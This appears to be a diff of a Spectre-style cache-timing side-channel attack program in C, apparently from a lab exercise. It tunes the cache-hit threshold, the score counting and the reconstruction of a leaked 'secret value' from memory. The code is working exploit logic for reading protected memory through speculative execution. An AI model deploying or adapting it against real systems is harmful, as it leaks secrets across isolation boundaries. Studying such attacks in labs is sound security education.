@@ -13,7 +13,7 @@ uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 uint8_t temp    = 0;
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (120) // update as needed
+#define CACHE_HIT_THRESHOLD (150) // update as needed
 #define DELTA 1024
 
 // Sandbox Function
@@ -51,8 +51,9 @@ int i;
     _mm_lfence();
     time2 = _rdtsc() - time1;
     _mm_lfence();
-    if (time2 <= CACHE_HIT_THRESHOLD)
+    if (time2 <= CACHE_HIT_THRESHOLD){
       scores[i]++; /* if cache hit, add 1 for this value */
+    }
   } 
 }
 
@@ -102,10 +103,13 @@ int main() {
         }
      int max = 1;
      for (i = 1; i < 256; i++){
-         if(scores[max] < scores[i]) max = i;
+         if(scores[max] <= scores[i]) max = i;
+     }
+     if(max >= 255){
+        break;
      }
     secret_array[index] = (char)max;
   }
-  printf("The secret value is %s\n", secret_array);
-  return (0); 
+    printf("The secret value is %s\n", secret_array);
+     return (0); 
 }
